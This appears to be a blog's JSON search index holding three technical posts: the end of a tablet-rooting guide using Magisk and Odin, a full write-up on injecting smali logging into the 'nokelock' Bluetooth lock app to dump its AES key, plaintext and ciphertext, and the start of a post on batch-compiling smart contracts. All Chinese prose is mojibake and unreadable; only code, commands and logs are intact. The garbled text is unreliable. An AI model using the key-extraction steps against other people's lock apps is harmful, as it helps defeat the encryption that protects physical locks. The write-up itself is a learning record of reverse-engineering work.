æˆåŠŸè¿æ¥ç”µè„‘åï¼Œè¿™ä¸ªåœ°æ–¹åº”è¯¥æ˜¾ç¤ºä¸ºè¿™ç§æµ…ç»¿è‰²ï¼Œè¡¨ç¤ºå¯ä»¥åˆ·æœº ä¹‹ååœ¨ windows ä¸­æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ adb reboot bootloader è¿›å…¥ Download ç•Œé¢ å¦‚æœè¿™ç§æ–¹æ³•ä¸è¡Œçš„è¯ï¼Œä½ ä¹Ÿå¯ä»¥æ‰‹åŠ¨è¿›å…¥ï¼Œå…·ä½“æ–¹æ³•æ˜¯å…ˆå°†å¹³æ¿å…³æœºï¼Œç„¶åé•¿æŒ‰ å¼€æœº å’Œ éŸ³é‡+ è¿™ä¸¤ä¸ªé”®ï¼Œä¹‹åä¼šé€‰æ‹© reboot to bootloader å°±å¯ä»¥äº† ä¹‹åå°† BL,AP,CSC æ–‡ä»¶éƒ½å¡«è¿›å»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œç‚¹å‡» Start, ç„¶ååç­‰åˆ·æœºå®Œæˆå°±å¯ä»¥äº† æ³¨æ„ï¼šè¿™é‡Œçš„ AP æ–‡ä»¶æ˜¯ç”± Magisk ä¿®è¡¥å¥½çš„æ–‡ä»¶ï¼ é‡æ–°å¼€æœºåï¼Œæˆ‘ä»¬ç”¨ adb shell su æµ‹è¯•ä¸€ä¸‹ ok æˆåŠŸ root","categories":[],"tags":[{"name":"root","slug":"root","permalink":"https://oacia.dev/tags/root/"},{"name":"å¹³æ¿åˆ·æœº","slug":"å¹³æ¿åˆ·æœº","permalink":"https://oacia.dev/tags/%E5%B9%B3%E6%9D%BF%E5%88%B7%E6%9C%BA/"},{"name":"BLé”","slug":"BLé”","permalink":"https://oacia.dev/tags/BL%E9%94%81/"},{"name":"magisk","slug":"magisk","permalink":"https://oacia.dev/tags/magisk/"},{"name":"odin3","slug":"odin3","permalink":"https://oacia.dev/tags/odin3/"}]},{"title":"å¯¹æŸapkçš„ä¸€æ¬¡æ’æ¡©è®°å½•","slug":"å¯¹æŸapkçš„ä¸€æ¬¡æ’æ¡©è®°å½•","date":"2023-03-27T10:32:22.000Z","updated":"2023-11-03T12:02:24.128Z","comments":true,"path":"å¯¹æŸapkçš„ä¸€æ¬¡æ’æ¡©è®°å½•/","link":"","permalink":"https://oacia.dev/%E5%AF%B9%E6%9F%90apk%E7%9A%84%E4%B8%80%E6%AC%A1%E6%8F%92%E6%A1%A9%E8%AE%B0%E5%BD%95/","excerpt":"","text":"ä»Šå¤©å—å¥½å‹ nameless çš„å§”æ‰˜ï¼Œå¯¹ä¸€ä¸ªåå« nokelock çš„ apk è¿›è¡Œæ’æ¡©ï¼Œå¸Œæœ›åœ¨æ—¥å¿—ä¸­æ‰“å°å‡ºè“ç‰™åŠ å¯†åŒ…çš„å¯†æ–‡ï¼Œå¯†é’¥ä¸æ˜æ–‡ï¼Œç”±äºæœ¬äººæ˜¯ç¬¬ä¸€æ¬¡å¯¹ apk è¿›è¡Œæ’æ¡©ï¼Œäºæ˜¯å†™äº†è¿™ä¸€ç¯‡æ–‡ç« ç”¨ä»¥å­¦ä¹ å’Œè®°å½•. # 0x01 ä»€ä¹ˆæ˜¯æ’æ¡©ï¼Ÿ ä¾æ®æœ¬äººçš„æ‹™è§ï¼Œæ’æ¡©å°±æ˜¯åœ¨åŸæœ‰çš„ä»£ç ä¸­æ’å…¥è‡ªå·±å†™çš„ä»£ç ï¼Œç”¨ä»¥æ‰“å°æŸäº›æƒ³è¦çŸ¥é“çš„å˜é‡çš„å€¼ã€‚å½“ç„¶äº†ï¼Œæ’å…¥çš„ä»£ç ä¹Ÿå¯ä»¥åœ¨åŸæœ‰ä»£ç çš„åŸºç¡€ä¸Šï¼Œä¸º app å¢åŠ å„ç§å„æ ·çš„é¢å¤–åŠŸèƒ½ã€‚ åœ¨è¿‡å»å­¦ä¹  fuzz çš„è¿‡ç¨‹ä¸­ï¼Œä¹Ÿæœ‰è¿‡æ’æ¡©è¿™ä¸€ä¸ªæ¦‚å¿µï¼Œè€Œè¿‡å»ä½¿ç”¨çš„ afl-fuzz æ˜¯åœ¨äºŒè¿›åˆ¶æ±‡ç¼–ä»£ç ä¸­æ’æ¡©ï¼Œè¿™ä¸€æ¬¡æ˜¯éœ€è¦åœ¨ apk ä¸­è¿›è¡Œæ’æ¡©ï¼Œä»Šæ—¥æ€»ä½“çš„æ’æ¡©æµç¨‹ä½“éªŒä¸‹æ¥ï¼Œæœ¬äººæ˜æ˜¾æ„Ÿè§‰åˆ°åœ¨ apk ä¸­æ’æ¡©çš„çµæ´»æ€§æ˜æ˜¾è·Ÿå¥½ï¼Œè€Œä¸”å¯æ“ä½œæ€§æ›´å¼º. # 0x02 å¯¹äº apk çš„åˆæ­¥å¤„ç† # éœ€è¦æ’æ¡©çš„ä»£ç ä½ç½® &amp;&amp; éœ€è¦æ‰“å°çš„å˜é‡åç§° ç°åœ¨æˆ‘ä»¬ç»™åˆ°çš„æ˜¯ä¸€ä¸ª base.apk å¦‚æœæˆ‘ä»¬æƒ³è¦å¯¹ä»£ç è¿›è¡Œæ’æ¡©ï¼Œé‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆéœ€è¦çŸ¥é“æˆ‘ä»¬è¦åœ¨ä»£ç çš„ä»€ä¹ˆåœ°æ–¹å»æ’æ¡© å¾ˆå¹¸è¿å½“æˆ‘ç»™åˆ°è¿™ä¸€ä¸ª apk çš„æ—¶å€™ï¼Œnameless å·²ç»æ‰¾åˆ°äº†éœ€è¦æ’æ¡©çš„ä»£ç ä½äº com.nokelock.blelibrary.b.b ä¸­ æˆ‘ä»¬ç”¨ jadx åç¼–è¯‘çœ‹ä¸€ä¸‹ç›¸å…³çš„ java ä»£ç  ä¸€çœ‹ä»£ç ï¼Œè¿™å°±æ˜¯å¾ˆå…¸å‹çš„ AES åŠ å¯†ï¼Œè€Œæˆ‘ä»¬éœ€è¦åœ¨æ—¥å¿—ä¸­æ‰“å°çš„å˜é‡ä¹Ÿä¸€ç›®äº†ç„¶ï¼Œåˆ†åˆ«æ˜¯ bArr , bArr2 å’Œ instance.doFinal(bArr) # å¾—åˆ° apk çš„ smali ä»£ç  å‡å¦‚æˆ‘ä»¬æƒ³è¦å¯¹ apk è¿›è¡Œæ’æ¡©ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥ä¿®æ”¹åç¼–è¯‘å‡ºçš„ java ä»£ç ï¼Œè€Œæ˜¯éœ€è¦ä¿®æ”¹æ¯” java ä»£ç æ›´åŠ åº•å±‚çš„ smali ä»£ç  ç®€å•æ¥è¯´ï¼Œjava å’Œ smali ä»£ç çš„å…³ç³»å¯ä»¥ç®€å•ç±»æ¯”ä¸º c è¯­è¨€å’Œæ±‡ç¼–è¯­è¨€ä¹‹é—´çš„å…³ç³» é‚£ä¹ˆå¦‚ä½•æŸ¥çœ‹ smali ä»£ç å‘¢ï¼Ÿ # ç®€å•æŸ¥çœ‹ smali ä»£ç  å¦‚æœåœ¨ jadx ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å¯¹ç›¸å…³çš„ java ä»£ç æŒ‰ä¸€ä¸‹ tab é”®ï¼Œç„¶åå°±èƒ½å¾—åˆ°æ›´åŠ åŸå§‹çš„ smali ä»£ç  ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶è¿™ç§æ–¹å¼å¯ä»¥æŸ¥çœ‹å…¶ smali ä»£ç ï¼Œä½†æ˜¯æ— æ³•é‡æ–°ç¼–è¯‘å¹¶æ‰“åŒ… apk, å°±æ˜¯è¯´ä½ å¯ä»¥çœ‹ï¼Œä½†æ˜¯ä½ æ”¹ä¸äº†:] # ä¿®æ”¹ smali ä»£ç å¹¶é‡æ–°æ‰“åŒ…ç­¾åç”Ÿæˆ apk è¿™é‡Œæˆ‘å¼ºçƒˆæ¨èä½¿ç”¨ apk easy tool è¿™ä¸ªå·¥å…·ï¼Œé—®å°±æ˜¯ç›¸å½“çš„å¥½ç”¨ï¼›) ä¸‹è½½å®Œæˆä¹‹åæ‰“å¼€ apk easy tool , ç„¶åæŠŠæˆ‘ä»¬éœ€è¦åç¼–è¯‘çš„ apk æ‹–åˆ°è¿™ä¸ªå·¥å…·é‡Œé¢ï¼Œç›´æ¥å…ˆç‚¹ä¸€ä¸‹åç¼–è¯‘ï¼Œç„¶ååœ¨ç‚¹ä¸€ä¸‹æ‰“å¼€åç¼–è¯‘ç›®å½•ï¼Œå°±å¯ä»¥çœ‹åˆ° apk çš„ smali ä»£ç äº† ä¹‹åæ ¹æ®æˆ‘ä»¬éœ€è¦æ’æ¡©çš„ä»£ç çš„è·¯å¾„ ( com.nokelock.blelibrary.b.b ) ä¸€çº§ä¸€çº§çš„ç‚¹è¿›å»ï¼Œå°±å¾—åˆ°äº†å¯ä»¥ç›´æ¥ç¼–è¾‘çš„ smali ä»£ç  # 0x03 å¦‚ä½•æ’æ¡©ï¼Ÿ å½“æˆ‘ä»¬æ‰“å¼€ b.smali æ–‡ä»¶åï¼Œé€šè¿‡å¯¹ç›¸åŒæ–¹æ³•åå’Œå½¢å‚ç±»å‹çš„å¯»æ‰¾ï¼Œæˆ‘ä»¬å¯ä»¥å¿«é€Ÿå®šä½åˆ°å¦‚ä¸‹ä»£ç æ®µ .method public static a([B[B)[B .locals 2 :try_start_0 new-instance v0, Ljavax/crypto/spec/SecretKeySpec; const-string v1, \"AES\" invoke-direct &#123;v0, p1, v1&#125;, Ljavax/crypto/spec/SecretKeySpec;->&lt;init>([BLjava/lang/String;)V const-string p1, \"AES/ECB/NoPadding\" invoke-static &#123;p1&#125;, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher; move-result-object p1 const/4 v1, 0x1 invoke-virtual &#123;p1, v1, v0&#125;, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V invoke-virtual &#123;p1, p0&#125;, Ljavax/crypto/Cipher;->doFinal([B)[B move-result-object p0 :try_end_0 .catch Ljava/lang/Exception; &#123;:try_start_0 .. :try_end_0&#125; :catch_0 return-object p0 :catch_0 const/4 p0, 0x0 return-object p0.end method.method public static b([B[B)[B .locals 2 :try_start_0 new-instance v0, Ljavax/crypto/spec/SecretKeySpec; const-string v1, \"AES\" invoke-direct &#123;v0, p1, v1&#125;, Ljavax/crypto/spec/SecretKeySpec;->&lt;init>([BLjava/lang/String;)V const-string p1, \"AES/ECB/NoPadding\" invoke-static &#123;p1&#125;, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher; move-result-object p1 const/4 v1, 0x2 invoke-virtual &#123;p1, v1, v0&#125;, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V invoke-virtual &#123;p1, p0&#125;, Ljavax/crypto/Cipher;->doFinal([B)[B move-result-object p0 :try_end_0 .catch Ljava/lang/Exception; &#123;:try_start_0 .. :try_end_0&#125; :catch_0 return-object p0 :catch_0 const/4 p0, 0x0 return-object p0.end methodåˆè§è¿™ç§ smali ä»£ç å¯èƒ½ä¼šæœ‰æ‰‹è¶³æ— æªçš„æ„Ÿè§‰ï¼Œä½†æ˜¯æˆ‘è‡ªå·±æ„Ÿè§‰ smali ä»£ç å…¶å®è¦æ¯”æ±‡ç¼–æ›´åŠ çš„ç®€å•æ˜“æ‡‚ å›åˆ°æ­£é¢˜ï¼Œå¯¹äºé¦–æ¬¡æ’æ¡©ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ github ä¸Šä¸‹è½½ç°æˆçš„æ’æ¡©ä»£ç  Smali æ’æ¡©è‡ªç”¨ä»£ç åº“ ç”¨æ³•å¾ˆç®€å•ï¼Œé¦–å…ˆå°†ä»£ç ä¸‹è½½ä¸‹æ¥ä¹‹åï¼Œå°† SewellDinGLog.smali ç›´æ¥å¤åˆ¶åˆ° apk easy tool åç¼–è¯‘å®Œæˆåçš„é‚£ä¸ª smail æ–‡ä»¶å¤¹ä¸­å¦‚å›¾æ‰€ç¤º # åœ¨å“ªé‡Œæ’æ¡©ï¼Ÿ ok æˆ‘ä»¬é‡æ–°å›åˆ° b.smali ä¸­ æˆ‘ä»¬å¯ä»¥æ’æ¡©çš„ä»£ç ä½ç½®æœ‰ä¸¤å¤„ (ä¸ºä»€ä¹ˆæ˜¯è¿™ä¸¤å¤„ï¼ï¼Ÿæ²¡æœ‰åˆ«çš„åœ°æ–¹å— ---- äº²èº«ç»å†ï¼Œè¦æ˜¯æ’æ¡©åœ¨åˆ«çš„åœ°æ–¹ä¼šæ— æ³•å›ç¼–è¯‘æŠ¥é”™ï¼š0) åœ¨ invoke-static/invoke-virtual/invoke-direct æŒ‡ä»¤è¿”å›ç±»å‹æ˜¯ V ä¹‹åå¯ä»¥åŠ å…¥ åœ¨ invoke-static/invoke-virtual/invoke-direct æŒ‡ä»¤è¿”å›ç±»å‹ä¸æ˜¯ Vï¼Œé‚£ä¹ˆåœ¨ move-result-object å‘½ä»¤ä¹‹åå¯ä»¥åŠ å…¥ # æ’æ¡©ä»£ç  invoke-static &#123;&#125;, LSewellDinGLog;->Log()V# æ— å‚æ•°ï¼Œç”¨æ¥åˆ¤æ–­å‡½æ•°æ˜¯å¦æ‰§è¡Œinvoke-static &#123;v1&#125;, LSewellDinGLog;->Log(Ljava/lang/Object;)V# æ‰“å°å­—ç¬¦ä¸²invoke-static &#123;v1&#125;, LSewellDinGLog;->Log([Ljava/lang/Object;)V# æ‰“å°æ•°ç»„è¿™é‡Œçš„æ’æ¡©ä»£ç æˆ‘ä»¬å¯ä»¥ç»“åˆ SewellDinGLog.java æ¥çœ‹ import java.util.Arrays;import android.util.Log;public class SewellDinGLog &#123; public static void Log(String tag, String msg) &#123;// ä¸¤ä¸ªå‚æ•° Log.d(tag, msg); &#125; public static void Log() &#123;// æ— å‚æ•° Log(\"SewellDinG\", \"DeBug ...\"); &#125; public static void Log(Object someObj) &#123;// ä¸€ä¸ªå‚æ•°ï¼Œæ‰“å°å­—ç¬¦ä¸² Log(\"SewellDinG\", someObj.toString()); &#125; public static void Log(Object[] someObj) &#123;// ä¸€ä¸ªå‚æ•°ï¼Œæ‰“å°æ•°ç»„ Log(\"SewellDinG\", Arrays.toString(someObj)); &#125;&#125;ä»£ç å¾ˆç®€å•ï¼Œå°±æ˜¯ç›´æ¥ä½¿ç”¨ Log æ¥æ‰“å°å˜é‡ éšåæˆ‘ä»¬ä¾¿å¯ä»¥æ ¹æ®æ’æ¡©çš„è§„åˆ™ï¼Œæ’å…¥ç›¸åº”çš„ä»£ç ï¼Œä½ç½®ç±»ä¼¼ä¸‹å›¾ éšåæˆ‘ä»¬å†æ¬¡æ‰“å¼€ apk easy tool , ç‚¹ä¸€ä¸‹å›ç¼–è¯‘ï¼Œåœ¨ç‚¹ä¸€ä¸‹æ‰“å¼€å›ç¼–è¯‘ç›®å½•ï¼Œå°±èƒ½æ‰¾åˆ°æœ€æ–°ç¼–è¯‘æˆåŠŸçš„ apk # æŸ¥çœ‹æ—¥å¿— ä¹‹åä½¿ç”¨ adb å‘½ä»¤è¿è¡Œè¯¥ apk, ç„¶åä½¿ç”¨å‘½ä»¤å°±å¯ä»¥æŸ¥çœ‹æ‰“å°çš„æ—¥å¿— adb logcat -s SewellDinG # 0x04 æ„æ–™ä¹‹å¤–çš„é”™è¯¯ ä½†æ˜¯å½“æˆ‘å°†æ’æ¡©åçš„ä»£ç å‘ç»™ nameless åï¼Œç¡®å®æœ‰æ—¥å¿—æ‰“å°å‡ºæ¥ï¼Œä½†æ˜¯å´æ˜¯é•¿è¿™ä¸ªæ ·å­çš„ F:\\platform-tools&gt;adb logcat -s SewellDinG --------- beginning of main 03-27 12:38:56.882 14325 14325 D SewellDinG: [B@3ad0a72 03-27 12:38:56.882 14325 14325 D SewellDinG: [B@85ec3 03-27 12:38:56.882 14325 14325 D SewellDinG: [B@e41f340 03-27 12:39:05.392 14325 14325 D SewellDinG: [B@4ee0ab4 03-27 12:39:05.392 14325 14325 D SewellDinG: [B@bd596dd 03-27 12:39:05.392 14325 14325 D SewellDinG: [B@9d6c252 æˆ‘æ­£ç–‘æƒ‘å‘¢éš¾é“å¯†é’¥å¯†æ–‡æ˜æ–‡éƒ½æ˜¯ [B@ å¼€å¤´çš„ï¼Ÿåæ¥æ‰å‘ç°æ˜¯ SewellDinGLog.smali ä»£ç æœ‰é—®é¢˜ é¦–å…ˆæˆ‘éœ€è¦æ‰“å°çš„æ˜¯ä¸€ä¸ª byte ç±»å‹æ˜¯æ•°ç»„ï¼Œè€Œæ‰“å°æ•°ç»„çš„ java ä»£ç æ˜¯é•¿è¿™ä¸ªæ ·å­çš„ public static void Log(Object[] someObj) &#123;// ä¸€ä¸ªå‚æ•°ï¼Œæ‰“å°æ•°ç»„ Log(\"SewellDinG\", Arrays.toString(someObj)); &#125;è¿™é‡Œå°±æœ‰é—®é¢˜äº†å‘€ï¼Œç›´æ¥ä½¿ç”¨ toString æ–¹æ³•ï¼Œå¯¹äºå­—èŠ‚æ•°ç»„æ¥è¯´è¿”å›æ˜¯å­—èŠ‚æ•°ç»„çš„åœ°å€è€Œéå­—èŠ‚æ•°ç»„çš„å€¼ï¼ # 0x05 å¤„ç† bug, é‡æ–°ç¼–å†™ä»£ç  SewellDinGLog.smali åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæˆ‘æ¸…æ¥šçš„è®¤è¯†åˆ°æˆ‘åº”è¯¥ä¿®æ”¹çš„æ˜¯ smali ä»£ç ï¼Œä½†æ˜¯å¦‚ä½•ä¿®æ”¹ï¼Ÿ æˆ‘è®¤ä¸ºæœ€ä¸ºç®€ä¾¿çš„æ–¹æ³•å°±æ˜¯å…ˆç¼–å†™ java ä»£ç ï¼Œç„¶åå†ç¼–è¯‘æˆ smali ä»£ç ï¼Œå¯æ˜¯è¦æ€ä¹ˆå®ç°å‘¢ï¼Ÿ æˆ‘ java çš„è¿è¡Œå¹³å°éƒ½æ˜¯ IDEA, ä½†æ˜¯æˆ‘å‘ç° SewellDinGLog.java æ‰€éœ€è¦çš„åŒ… android.util.Log æ ¹æœ¬å°±æ²¡æœ‰ï¼Œåœ¨ç½‘ä¸Šæ‰¾äº†æ‰¾ä¹Ÿæ‰¾ä¸åˆ°è¿™ä¸ªåŒ…ï¼Œä¹‹åé€šè¿‡ google äº†å¾ˆä¹…ï¼Œæ‰çŸ¥é“æˆ‘éœ€è¦å®‰è£…ä¸€ä¸ª Android Studio å®‰è£…å¥½äº†ä¹‹åï¼Œå°±æ–°å»ºä¸€ä¸ªé¡¹ç›®ï¼Œç„¶åæŠŠè¦è¿è¡Œçš„ä»£ç å¤åˆ¶ç²˜è´´è¿›å» è¦æ³¨æ„è¿™é‡Œ Language ä¸€å®šè¦é€‰ Java, ä¸è¦é€‰ Kotlin , ä¸ç„¶å¾—åƒæˆ‘ä¸€æ ·ä¸‹äº†å¾ˆä¹…çš„å®‰è£…åŒ…æœ€åå‘ç°ä»£ç æ ¹æœ¬è¿è¡Œä¸äº† ç¬¬ä¸€æ¬¡ä½¿ç”¨ Android studio , å¾—éœ€è¦ç­‰å¤§çº¦å‡ ååˆ†é’Ÿå®‰è£…è¿è¡Œæ‰€éœ€è¦çš„åŒ… éšåç‚¹å‡» File--&gt;Settings--&gt;Plugins , ç„¶ååœ¨æ’ä»¶å¸‚åœºæœç´¢ java2smali , å®‰è£…å®Œä¹‹åé‡å¯ Android studio , ç„¶ååœ¨ Build--&gt;Compile to smali å°±å¯ä»¥ç›´æ¥ç”Ÿæˆ smali ä»£ç äº† ä¸ºäº†èƒ½å¤ŸæˆåŠŸ Log æ‰“å°å­—èŠ‚æ•°ç»„ï¼Œæˆ‘ä»¬éœ€è¦å¯¹åŸå…ˆçš„ SewellDinGLog.java ä»£ç è¿›è¡Œç›¸åº”çš„ä¿®æ”¹ï¼Œç„¶åä½¿ç”¨ Build--&gt;Compile to smali ç”Ÿæˆ smail ä»£ç  ä¿®æ”¹åçš„ java ä»£ç å¦‚ä¸‹ package com.example.newlog;import android.util.Log;public class SewellDinGLog &#123; final protected static char[] hexArray = \"0123456789ABCDEF\".toCharArray(); public static String bytesToHex(byte[] bytes) &#123; char[] hexChars = new char[bytes.length * 2]; for ( int j = 0; j &lt; bytes.length; j++ ) &#123; int v = bytes[j] &amp; 0xFF; hexChars[j * 2] = hexArray[v >>> 4]; hexChars[j * 2 + 1] = hexArray[v &amp; 0x0F]; &#125; return new String(hexChars); &#125; public static void Log(String tag, String msg) &#123; Log.d(tag, msg); &#125; public static void Log() &#123; Log(\"SewellDinG\", \"DeBug ...\"); &#125; public static void Log(byte[] someObj) &#123; String result = bytesToHex(someObj); Log(\"SewellDinG\", result); &#125;&#125;éšååœ¨åŒçº§æ–‡ä»¶å¤¹ä¸‹å°±ä¼šç”Ÿæˆ SewellDinGLog.smali è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ç”±äºæˆ‘ä»¬çš„ SewellDinGLog.smali æ˜¯æ”¾åœ¨ apk easy tool åç¼–è¯‘åçš„ smali æ–‡ä»¶å¤¹çš„æ ¹æ–‡ä»¶å¤¹ä¸‹ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹ SewellDinGLog.smali å†…çš„ä»£ç è¿›è¡Œä¿®æ”¹ ä¾‹å¦‚æˆ‘è¿™é‡Œ é‚£ä¹ˆéœ€è¦å°†æ‰€æœ‰çš„ Lcom/example/newlog/SewellDinGLog å…¨éƒ¨æ›¿æ¢æˆ LSewellDinGLog å˜æˆè¿™æ · éšåå’Œä¹‹å‰çš„æ­¥éª¤ä¸€æ¨¡ä¸€æ ·ï¼ŒæŠŠ SewellDinGLog.smali å¤åˆ¶åˆ° smali æ–‡ä»¶å¤¹å†…ï¼Œç„¶åæ’æ¡©ï¼Œå›ç¼–è¯‘å°±å¯ä»¥äº† æ’æ¡©åçš„ apk æˆ‘ä»¬å†ç”¨ jadx åç¼–è¯‘çœ‹çœ‹ å‘ç°ç›¸è¾ƒä¹‹å‰å¤šäº† SewellDinGLog.Log å‡½æ•°ç”¨ä»¥æ‰“å°å˜é‡çš„å€¼ æœ€åæˆ‘ä»¬ä¹Ÿæ˜¯æˆåŠŸæ‰“å°å‡ºå˜é‡çš„å€¼ F:\\platform-tools&gt;adb logcat -s SewellDinG --------- beginning of main 03-27 17:18:08.895 31117 31117 D SewellDinG: 05010630303030303082E3C89616017D 03-27 17:18:08.895 31117 31117 D SewellDinG: 241F632E5907042061014C1A3A45193B 03-27 17:18:08.895 31117 31117 D SewellDinG: 6629B62C88A7E50525E92C328AF258E6 03-27 17:18:10.114 31117 31117 D SewellDinG: 732F5CB22C06B0C2D0D17AD31D165805 03-27 17:18:10.114 31117 31117 D SewellDinG: 241F632E5907042061014C1A3A45193B 03-27 17:18:10.114 31117 31117 D SewellDinG: 05020100E3C896010202000000000000 03-27 17:18:11.770 31117 31117 D SewellDinG: 530B1FCA1467A408A321E71F3D152127 03-27 17:18:11.771 31117 31117 D SewellDinG: 241F632E5907042061014C1A3A45193B # 0x06 ä¸€ä¸ªè‡ªé—®è‡ªç­” Q: ä¸ºä»€ä¹ˆä¸ç›´æ¥ä½¿ç”¨ android.util.Log ä¸­çš„ Log å‡½æ•°æ¥æ‰“å°ï¼Œå³åœ¨éœ€è¦æ’æ¡©çš„ä½ç½®æ’å…¥è¿™ä¸²ä»£ç  invoke-static &#123;p0, p1&#125;, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I, è€Œæ˜¯è°ƒç”¨å¦ä¸€ä¸ªç±»ä¸­çš„å‡½æ•°æ¥æ‰“å°å‘¢ï¼Ÿ A: æˆ‘è®¤ä¸ºé‡å†™ä¸€ä¸ª Log æ‰“å°æ–¹æ³•ï¼Œçµæ´»æ€§å°†ä¼šæ›´é«˜ï¼Œæˆ‘ä»¬å¯ä»¥å°†å¤æ‚çš„ä»£ç å…ˆç”¨ java ç¼–å†™ï¼Œç„¶åå†ç¼–è¯‘æˆ smali, è¿™æ ·æ¯”ç›´æ¥ç”¨ smali å†™ä»£ç è¦æ›´ç®€å•æ–¹ä¾¿ï¼Œåªéœ€è¦æ’æ¡©çš„ä½ç½®æ·»åŠ ä¸€ä¸ªå‡½æ•°æ–¹æ³•çš„è°ƒç”¨å°±å¯ä»¥äº†.","categories":[],"tags":[{"name":"å®‰å“é™æ€æ’æ¡©","slug":"å®‰å“é™æ€æ’æ¡©","permalink":"https://oacia.dev/tags/%E5%AE%89%E5%8D%93%E9%9D%99%E6%80%81%E6%8F%92%E6%A1%A9/"},{"name":"smali","slug":"smali","permalink":"https://oacia.dev/tags/smali/"}]},{"title":"æ‰¹é‡ç¼–è¯‘æ™ºèƒ½åˆçº¦è¿‡ç¨‹è®°å½•","slug":"æ‰¹é‡ç¼–è¯‘æ™ºèƒ½åˆçº¦è¿‡ç¨‹è®°å½•","date":"2023-03-20T12:29:52.000Z","updated":"2023-07-01T03:55:10.174Z","comments":true,"path":"æ‰¹é‡ç¼–è¯‘æ™ºèƒ½åˆçº¦è¿‡ç¨‹è®°å½•/","link":"","permalink":"https://oacia.dev/%E6%89%B9%E9%87%8F%E7%BC%96%E8%AF%91%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/","excerpt":"","text":"è¿™ä¸¤å¤©çš„åŒºå—é“¾ç ”ç©¶æˆ‘çš„ä»»åŠ¡æ˜¯è¦æŠŠå¤§çº¦äº”ä¸‡ä¸ªæ™ºèƒ½åˆçº¦çš„æºç ç¼–è¯‘æˆå­—èŠ‚ç çš„å½¢å¼ï¼Œå¹¶ä¸”æå–æ™ºèƒ½åˆçº¦ä¸­æ‰€ç”¨åˆ°çš„å…¬å¼€åº“ï¼Œè¿‡ç¨‹ä¸­é‡åˆ°äº†ä¸€äº›å›°éš¾ï¼Œå½“ç„¶ä¹Ÿæ˜¯æœ‰æ”¶è·çš„ï¼Œæ‰€ä»¥åœ¨è¿™ä¸ªä»»åŠ¡åšå®Œä¹‹åï¼Œå†™äº†è¿™ç¯‡æ–‡ç« è®°å½•ä¸€ä¸‹ # 0x01 åˆæ­¥åˆ†æ æˆ‘ä»¬éœ€è¦æ‰¹é‡ç¼–è¯‘çš„æ™ºèƒ½åˆçº¦æ‰€åœ¨çš„æ–‡ä»¶å¤¹ç»“æ„å¦‚ä¸‹ â”œâ”€0x01ea1afecdab69ab00212e6f9ed0209c0bf75ac9 â”‚ code.abi â”‚ code.sol â”‚ contract_creation_code â”‚ info â”‚ â”œâ”€0x01eacc3ae59ee7fbbc191d63e8e1ccfdac11628c â”‚ code.abi â”‚ code.sol â”‚ contract_creation_code â”‚ info # å­æ–‡ä»¶åˆ†æ 0x01ea1afecdab69ab00212e6f9ed0209c0bf75ac9 åˆçº¦åœ°å€ code.abi æ™ºèƒ½åˆçº¦çš„ ABI æ–‡ä»¶ code.sol æ™ºèƒ½åˆçº¦çš„æºç  contract_creation_code è¿™æ˜¯ä¸€ä¸ªç©ºæ–‡ä»¶ï¼Œæš‚æœªå‘ç°è¯¥æ–‡ä»¶çš„å…¶ä»–å†…å®¹ info å‚¨å­˜äº†åˆçº¦ç¼–è¯‘è¿‡ç¨‹ä¸­æ‰€éœ€è¦çš„å˜é‡å info æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ GasToken2//GasToken2ä¸ºæ™ºèƒ½åˆçº¦çš„åˆçº¦åç§°,ç”±äºåœ¨code.solæ–‡ä»¶ä¸­ä¸æ­¢æœ‰ä¸€ä¸ªcontract,æ‰€ä»¥è¿™ä¸ªåç§°æ˜¯ååˆ†é‡è¦çš„ v0.4.16+commit.d7661dd9//ç¼–è¯‘å™¨çš„ç‰ˆæœ¬ 0 200 # 0x02 æå–å…¬å¼€åº“ä¸ç¼–è¯‘æ™ºèƒ½åˆçº¦çš„å®ç°æ–¹å¼æ€è€ƒ # å¦‚ä½•æå–æ™ºèƒ½åˆçº¦ä¸­æ‰€ç”¨åˆ°çš„å…¬å¼€åº“ï¼Ÿ é€šè¿‡å¯¹ code.sol è¿›è¡Œåˆ†æï¼Œæˆ‘ä»¬å‘ç°åªæœ‰æå°‘çš„å…¬å¼€åº“ä½¿ç”¨äº† import è¿™ä¸€å…¬å¼€åº“çš„è°ƒç”¨æ–¹å¼ï¼Œä¾‹å¦‚ä»¥ä¸‹å½¢å¼: import &quot;./SafeMath.sol&quot;; è€Œç»å¤§å¤šæ•°çš„æ™ºèƒ½åˆçº¦æºä»£ç è°ƒç”¨å…¬å¼€åº“çš„æ–¹å¼éƒ½æ˜¯é€šè¿‡å°†å…¬å¼€åº“çš„ä»£ç ç›´æ¥å¤åˆ¶åˆ°æ™ºèƒ½åˆçº¦æºä»£ç å†…ï¼Œç„¶ååœ¨åŒä¸€ä¸ª .sol ä¸­è¿›è¡Œè°ƒç”¨ï¼Œç¤ºä¾‹å¦‚ä¸‹ pragma solidity ^0.4.25;/*** @title SafeMath* @dev Math operations with safety checks that throw on error*/library SafeMath &#123; //... å…¬å¼€åº“ä»£ç &#125;contract AuctionPotato &#123; using SafeMath for uint256; // è°ƒç”¨å…¬å¼€åº“ //... æ™ºèƒ½åˆçº¦çš„æºä»£ç  &#125;è€Œå…¬å¼€åº“å‰çš„ç±»å‹å®šä¹‰ç¬¦å…±æœ‰ä¸‰ç§ï¼Œåˆ†åˆ«æ˜¯ library , contract å’Œ interface æ‰€ä»¥æˆ‘ä»¬ä¾¿å¯ä»¥é¡ºç†æˆç« 